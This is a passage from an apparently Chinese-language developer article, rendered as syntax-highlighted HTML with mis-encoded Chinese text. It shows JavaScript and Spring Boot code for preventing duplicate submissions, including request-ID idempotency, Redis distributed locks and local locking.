<span class="hljs-keyword">const</span> <span class="hljs-title function_">generateRequestKey</span> = (<span class="hljs-params">config</span>) =&gt; {
  <span class="hljs-keyword">const</span> { method, url, params, data } = config
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${method}</span>_<span class="hljs-subst">${url}</span>_<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(params)}</span>_<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(data)}</span>`</span>
}

<span class="hljs-comment">// è¯·æ±‚æ‹¦æˆªå™¨</span>
axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> requestKey = <span class="hljs-title function_">generateRequestKey</span>(config)
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰ç›¸åŒçš„è¯·æ±‚æ­£åœ¨è¿›è¡Œ</span>
    <span class="hljs-keyword">if</span> (pendingRequests.<span class="hljs-title function_">has</span>(requestKey)) {
      <span class="hljs-comment">// å–æ¶ˆå½“å‰è¯·æ±‚</span>
      config.<span class="hljs-property">cancelToken</span> = <span class="hljs-keyword">new</span> axios.<span class="hljs-title class_">CancelToken</span>(<span class="hljs-function">(<span class="hljs-params">cancel</span>) =&gt;</span> {
        <span class="hljs-title function_">cancel</span>(<span class="hljs-string">'é‡å¤è¯·æ±‚å·²å–æ¶ˆ'</span>)
      })
      <span class="hljs-keyword">return</span> config
    }
    
    <span class="hljs-comment">// å°†è¯·æ±‚æ·»åŠ åˆ°pendingåˆ—è¡¨</span>
    pendingRequests.<span class="hljs-title function_">set</span>(requestKey, config)
    
    <span class="hljs-keyword">return</span> config
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
  }
)

<span class="hljs-comment">// å“åº”æ‹¦æˆªå™¨</span>
axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> requestKey = <span class="hljs-title function_">generateRequestKey</span>(response.<span class="hljs-property">config</span>)
    pendingRequests.<span class="hljs-title function_">delete</span>(requestKey)
    <span class="hljs-keyword">return</span> response
  },
  <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">config</span>) {
      <span class="hljs-keyword">const</span> requestKey = <span class="hljs-title function_">generateRequestKey</span>(error.<span class="hljs-property">config</span>)
      pendingRequests.<span class="hljs-title function_">delete</span>(requestKey)
    }
    
    <span class="hljs-comment">// å¤„ç†å–æ¶ˆçš„è¯·æ±‚</span>
    <span class="hljs-keyword">if</span> (axios.<span class="hljs-title function_">isCancel</span>(error)) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¯·æ±‚å·²å–æ¶ˆï¼š'</span>, error.<span class="hljs-property">message</span>)
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error)
  }
)

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> axios
</code></pre>
<h5 data-id="heading-16">3.2.2 åŸºäºè¯·æ±‚IDçš„å¹‚ç­‰æ€§</h5>
<p><strong>å‰ç«¯ç”Ÿæˆè¯·æ±‚IDï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/requestId.js</span>
<span class="hljs-keyword">import</span> { v4 <span class="hljs-keyword">as</span> uuidv4 } <span class="hljs-keyword">from</span> <span class="hljs-string">'uuid'</span>

<span class="hljs-comment">// ä¸ºæ¯ä¸ªè¯·æ±‚æ·»åŠ å”¯ä¸€ID</span>
axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">config</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (!config.<span class="hljs-property">headers</span>[<span class="hljs-string">'X-Request-Id'</span>]) {
    config.<span class="hljs-property">headers</span>[<span class="hljs-string">'X-Request-Id'</span>] = <span class="hljs-title function_">uuidv4</span>()
  }
  <span class="hljs-keyword">return</span> config
})
</code></pre>
<p><strong>åç«¯éªŒè¯è¯·æ±‚IDï¼ˆSpringBoot 2.xï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;

<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-comment">/**
 * è¯·æ±‚å¹‚ç­‰æ€§æ‹¦æˆªå™¨
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨Rediså­˜å‚¨è¯·æ±‚IDï¼Œé˜²æ­¢é‡å¤è¯·æ±‚
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdempotentInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HandlerInterceptorAdapter</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">REQUEST_ID_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">"request:id:"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">EXPIRE_SECONDS</span> <span class="hljs-operator">=</span> <span class="hljs-number">300</span>; <span class="hljs-comment">// 5åˆ†é’Ÿè¿‡æœŸ</span>
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, 
                           HttpServletResponse response, 
                           Object handler)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// åªæ‹¦æˆªPOSTã€PUTã€DELETEè¯·æ±‚</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();
        <span class="hljs-keyword">if</span> (!<span class="hljs-string">"POST"</span>.equals(method) &amp;&amp; !<span class="hljs-string">"PUT"</span>.equals(method) &amp;&amp; !<span class="hljs-string">"DELETE"</span>.equals(method)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-type">String</span> <span class="hljs-variable">requestId</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"X-Request-Id"</span>);
        <span class="hljs-keyword">if</span> (StringUtils.isBlank(requestId)) {
            <span class="hljs-comment">// æ²¡æœ‰è¯·æ±‚IDï¼Œå…è®¸é€šè¿‡ï¼ˆå…¼å®¹æ—§æ¥å£ï¼‰</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> REQUEST_ID_PREFIX + requestId;
        
        <span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚IDæ˜¯å¦å·²å­˜åœ¨</span>
        <span class="hljs-type">Boolean</span> <span class="hljs-variable">exists</span> <span class="hljs-operator">=</span> redisTemplate.hasKey(key);
        <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(exists)) {
            <span class="hljs-comment">// è¯·æ±‚é‡å¤ï¼Œè¿”å›é”™è¯¯</span>
            response.setStatus(HttpStatus.CONFLICT.value());
            response.getWriter().write(<span class="hljs-string">"{\"code\":409,\"message\":\"è¯·æ±‚é‡å¤\"}"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-comment">// å­˜å‚¨è¯·æ±‚ID</span>
        redisTemplate.opsForValue().set(key, <span class="hljs-string">"1"</span>, EXPIRE_SECONDS, TimeUnit.SECONDS);
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h4 data-id="heading-17">3.3 çŠ¶æ€ç®¡ç†æ§åˆ¶</h4>
<h5 data-id="heading-18">3.3.1 Vuex/Pinia çŠ¶æ€ç®¡ç†</h5>
<p><strong>Vue3 + Pinia å®ç°ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// stores/order.js</span>
<span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useOrderStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'order'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">submitting</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">submitTimestamp</span>: <span class="hljs-number">0</span>
  }),
  
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">submitOrder</span>(<span class="hljs-params">orderData</span>) {
      <span class="hljs-comment">// é˜²æ­¢é‡å¤æäº¤ï¼š5ç§’å†…ä¸å…è®¸é‡å¤æäº¤</span>
      <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">submitting</span> || (now - <span class="hljs-variable language_">this</span>.<span class="hljs-property">submitTimestamp</span> &lt; <span class="hljs-number">5000</span>)) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'è¯·å‹¿é‡å¤æäº¤'</span>)
      }
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">submitting</span> = <span class="hljs-literal">true</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">submitTimestamp</span> = now
      
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/order/submit'</span>, orderData)
        <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>
      } <span class="hljs-keyword">finally</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">submitting</span> = <span class="hljs-literal">false</span>
      }
    }
  }
})

<span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨</span>
&lt;script setup&gt;
<span class="hljs-keyword">import</span> { useOrderStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/stores/order'</span>

<span class="hljs-keyword">const</span> orderStore = <span class="hljs-title function_">useOrderStore</span>()

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> orderStore.<span class="hljs-title function_">submitOrder</span>(orderData)
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">'æäº¤æˆåŠŸ'</span>)
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(error.<span class="hljs-property">message</span>)
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-19">å››ã€åç«¯é˜²å¹¶å‘æ–¹æ¡ˆ</h3>
<h4 data-id="heading-20">4.1 åº”ç”¨å±‚é˜²å¹¶å‘</h4>
<h5 data-id="heading-21">4.1.1 åˆ†å¸ƒå¼é”ï¼ˆRediså®ç°ï¼‰</h5>
<p><strong>å®Œæ•´å®ç°ï¼ˆSpringBoot 2.xï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.script.DefaultRedisScript;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.util.Collections;
<span class="hljs-keyword">import</span> java.util.UUID;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-comment">/**
 * Redis åˆ†å¸ƒå¼é”å·¥å…·ç±»
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨Luaè„šæœ¬ä¿è¯åŸå­æ€§ï¼Œé˜²æ­¢è¯¯åˆ å…¶ä»–å®ä¾‹çš„é”
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x + Spring Data Redis 1.7.2
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedLockUtil</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">UNLOCK_SCRIPT</span> <span class="hljs-operator">=</span> 
        <span class="hljs-string">"if redis.call('get', KEYS[1]) == ARGV[1] then "</span> +
        <span class="hljs-string">"return redis.call('del', KEYS[1]) "</span> +
        <span class="hljs-string">"else return 0 end"</span>;
    
    <span class="hljs-comment">/**
     * å°è¯•è·å–é”
     * <span class="hljs-doctag">@param</span> lockKey é”çš„key
     * <span class="hljs-doctag">@param</span> lockValue é”çš„valueï¼ˆå»ºè®®ä½¿ç”¨UUIDï¼‰
     * <span class="hljs-doctag">@param</span> expireSeconds è¿‡æœŸæ—¶é—´ï¼ˆç§’ï¼‰
     * <span class="hljs-doctag">@return</span> æ˜¯å¦è·å–æˆåŠŸ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(String lockKey, String lockValue, <span class="hljs-type">int</span> expireSeconds)</span> {
        <span class="hljs-type">Boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue()
            .setIfAbsent(lockKey, lockValue, expireSeconds, TimeUnit.SECONDS);
        <span class="hljs-keyword">return</span> Boolean.TRUE.equals(result);
    }
    
    <span class="hljs-comment">/**
     * é‡Šæ”¾é”ï¼ˆä½¿ç”¨Luaè„šæœ¬ä¿è¯åŸå­æ€§ï¼‰
     * <span class="hljs-doctag">@param</span> lockKey é”çš„key
     * <span class="hljs-doctag">@param</span> lockValue é”çš„value
     * <span class="hljs-doctag">@return</span> æ˜¯å¦é‡Šæ”¾æˆåŠŸ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">releaseLock</span><span class="hljs-params">(String lockKey, String lockValue)</span> {
        DefaultRedisScript&lt;Long&gt; script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;();
        script.setScriptText(UNLOCK_SCRIPT);
        script.setResultType(Long.class);
        <span class="hljs-type">Long</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> redisTemplate.execute(
            script, 
            Collections.singletonList(lockKey), 
            lockValue
        );
        <span class="hljs-keyword">return</span> result != <span class="hljs-literal">null</span> &amp;&amp; result == <span class="hljs-number">1</span>;
    }
    
    <span class="hljs-comment">/**
     * è·å–é”ï¼ˆå¸¦é‡è¯•æœºåˆ¶ï¼‰
     * <span class="hljs-doctag">@param</span> lockKey é”çš„key
     * <span class="hljs-doctag">@param</span> expireSeconds è¿‡æœŸæ—¶é—´ï¼ˆç§’ï¼‰
     * <span class="hljs-doctag">@param</span> maxWaitSeconds æœ€å¤§ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
     * <span class="hljs-doctag">@return</span> é”çš„valueï¼Œè·å–å¤±è´¥è¿”å›null
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">lockWithRetry</span><span class="hljs-params">(String lockKey, <span class="hljs-type">int</span> expireSeconds, <span class="hljs-type">int</span> maxWaitSeconds)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">lockValue</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
        <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis() + maxWaitSeconds * <span class="hljs-number">1000</span>;
        
        <span class="hljs-keyword">while</span> (System.currentTimeMillis() &lt; endTime) {
            <span class="hljs-keyword">if</span> (tryLock(lockKey, lockValue, expireSeconds)) {
                <span class="hljs-keyword">return</span> lockValue;
            }
            
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// ç­‰å¾…100msåé‡è¯•</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-comment">/**
 * è®¢å•æœåŠ¡ç¤ºä¾‹
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨åˆ†å¸ƒå¼é”é˜²æ­¢å¹¶å‘åˆ›å»ºè®¢å•
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DistributedLockUtil distributedLockUtil;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
    
    <span class="hljs-comment">/**
     * åˆ›å»ºè®¢å•ï¼ˆé˜²å¹¶å‘ï¼‰
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">createOrder</span><span class="hljs-params">(CreateOrderParam param)</span> {
        <span class="hljs-comment">// æ„å»ºé”çš„keyï¼šç”¨æˆ·ID + å•†å“ID</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">lockKey</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">"order:create:%s:%s"</span>, 
            param.getUserId(), param.getProductId());
        <span class="hljs-type">String</span> <span class="hljs-variable">lockValue</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
        <span class="hljs-type">int</span> <span class="hljs-variable">expireSeconds</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>; <span class="hljs-comment">// é”30ç§’è¿‡æœŸ</span>
        
        <span class="hljs-comment">// å°è¯•è·å–é”</span>
        <span class="hljs-keyword">if</span> (!distributedLockUtil.tryLock(lockKey, lockValue, expireSeconds)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.SERVICE_ERROR.code(), 
                <span class="hljs-string">"è®¢å•åˆ›å»ºä¸­ï¼Œè¯·å‹¿é‡å¤æäº¤"</span>);
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²å­˜åœ¨è®¢å•</span>
            <span class="hljs-type">OrderPO</span> <span class="hljs-variable">existingOrder</span> <span class="hljs-operator">=</span> orderMapper.selectByUserIdAndProductId(
                param.getUserId(), param.getProductId());
            <span class="hljs-keyword">if</span> (existingOrder != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceException</span>(CommonCode.RECORD_EXISTED.code(), 
                    <span class="hljs-string">"è®¢å•å·²å­˜åœ¨"</span>);
            }
            
            <span class="hljs-comment">// åˆ›å»ºè®¢å•</span>
            <span class="hljs-type">OrderPO</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderPO</span>();
            order.setUserId(param.getUserId());
            order.setProductId(param.getProductId());
            order.setAmount(param.getAmount());
            order.setStatus(OrderStatusEnum.PENDING.getCode());
            orderMapper.insert(order);
            
            log.info(<span class="hljs-string">"è®¢å•åˆ›å»ºæˆåŠŸï¼šorderId={}"</span>, order.getId());
            <span class="hljs-keyword">return</span> convertToDTO(order);
            
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// é‡Šæ”¾é”</span>
            distributedLockUtil.releaseLock(lockKey, lockValue);
        }
    }
}
</code></pre>
<h5 data-id="heading-22">4.1.2 æœ¬åœ°é”ï¼ˆå•æœºåœºæ™¯ï¼‰</h5>
<p><strong>synchronized å®ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æœ¬åœ°é”ç¤ºä¾‹ï¼ˆå•æœºéƒ¨ç½²ï¼‰
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨synchronizedä¿è¯çº¿ç¨‹å®‰å…¨
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šJDK 1.8+
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalLockService</span> {
    
    <span class="hljs-comment">/**
     * ä½¿ç”¨synchronizedæ–¹æ³•é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processWithMethodLock</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
        doBusiness(key);
    }
    
    <span class="hljs-comment">/**
     * ä½¿ç”¨synchronizedä»£ç å—é”
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processWithBlockLock</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
            doBusiness(key);
        }
    }
    
    <span class="hljs-comment">/**
     * ä½¿ç”¨ReentrantLockï¼ˆæ›´çµæ´»ï¼‰
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">reentrantLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processWithReentrantLock</span><span class="hljs-params">(String key)</span> {
        reentrantLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
            doBusiness(key);
        } <span class="hljs-keyword">finally</span> {
            reentrantLock.unlock();
        }
    }
}
</code></pre>
<h5 data-id="heading-23">4.1.3 å¹‚ç­‰æ€§è®¾è®¡</h5>
<p><strong>åŸºäºå”¯ä¸€ä¸šåŠ¡æ ‡è¯†çš„å¹‚ç­‰æ€§ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-comment">/**
 * å¹‚ç­‰æ€§æœåŠ¡ç¤ºä¾‹
 * ã€è§„èŒƒæ ¡éªŒã€‘ï¼šä½¿ç”¨Redis + æ•°æ®åº“å”¯ä¸€ç´¢å¼•ä¿è¯å¹‚ç­‰æ€§
 * ã€ç‰ˆæœ¬å…¼å®¹ã€‘ï¼šSpringBoot 2.x
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdempotentService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IDEMPOTENT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">"idempotent:"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">EXPIRE_SECONDS</span> <span class="hljs-operator">=</span> <span class="hljs-number">300</span>; <span class="hljs-comment">// 5åˆ†é’Ÿ</span>
    
    <span class="hljs-comment">/**
     * å¹‚ç­‰æ€§åˆ›å»ºè®¢å•
     * <span class="hljs-doctag">@param</span> param è®¢å•å‚æ•°
     * <span class="hljs-doctag">@param</span> idempotentKey å¹‚ç­‰æ€§keyï¼ˆå¦‚ï¼šè®¢å•å·ã€è¯·æ±‚IDï¼‰
     * <span class="hljs-doctag">@return</span> è®¢å•ID
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">createOrderIdempotent</span><span class="hljs-params">(CreateOrderParam param, String idempotentKey)</span> {
        <span class="hljs-comment">// 1. æ£€æŸ¥Redisä¸­æ˜¯å¦å­˜åœ¨å¹‚ç­‰æ€§key</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">redisKey</span> <span class="hljs-operator">=</span> IDEMPOTENT_PREFIX + idempotentKey;
        <span class="hljs-type">String</span> <span class="hljs-variable">existingOrderId</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(redisKey);
        
        <span class="hljs-keyword">if</span> (StringUtils.isNotBlank(existingOrderId)) {
            log.info(<span class="hljs-string">"å¹‚ç­‰æ€§æ£€æŸ¥ï¼šè®¢å•å·²å­˜åœ¨ï¼ŒorderId={}"</span>, existingOrderId);
            <span class="hljs-keyword">return</span> Long.parseLong(existingOrderId);
        }
        
        <span class="hljs-comment">// 2. æ£€æŸ¥æ•°æ®åº“ä¸­æ˜¯å¦å­˜åœ¨ï¼ˆåŒé‡æ£€æŸ¥ï¼‰</span>
        <span class="hljs-type">OrderPO</span> <span class="hljs-variable">existingOrder</span> <span class="hljs-operator">=</span> orderMapper.selectByOrderNo(idempotentKey);
        <span class="hljs-keyword">if</span> (existingOrder != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å›å†™Redis</span>
            redisTemplate.opsForValue().set(
                redisKey, 
                existingOrder.getId().toString(), 
                EXPIRE_SECONDS, 
                TimeUnit.SECONDS
            );
            <span class="hljs-keyword">return</span> existingOrder.getId();
        }
        
        <span class="hljs-comment">// 3. åˆ›å»ºè®¢å•</span>
        <span class="hljs-type">OrderPO</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderPO</span>();
        order.setOrderNo(idempotentKey); <span class="hljs-comment">// ä½¿ç”¨å¹‚ç­‰æ€§keyä½œä¸ºè®¢å•å·</span>
        order.setUserId(param.getUserId());
        order.setAmount(param.getAmount());
        orderMapper.insert(order);
        
        <span class="hljs-comment">// 4. å†™å…¥Redis</span>
        redisTemplate.opsForValue().set(
            redisKey, 
            order.getId().toString(), 
            EXPIRE_SECONDS, 
            TimeUnit.SECONDS
        );
        
        log.info(<span class="hljs-string">"è®¢å•åˆ›å»ºæˆåŠŸï¼šorderId={}, orderNo={}"</span>, order.getId(), idempotentKey);
        <span class="hljs-keyword">return</span> order.getId();
    }
}
</code></pre>
<p><strong>å¹‚ç­‰æ€§æ³¨è§£å®ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.lang.annotation.ElementType;
<span class="hljs-keyword">import</span> java.lang.annotation.Retention;
<span class="hljs-keyword">import</span> java.lang.annotation.RetentionPolicy;
<span class="hljs-keyword">import</span> java.lang.annotation.Target;

<span class="hljs-comment">/**
 * å¹‚ç­‰æ€§æ³¨è§£
 */</span>
<span class="hljs-meta">@Target(ElementType.METHOD)</span>
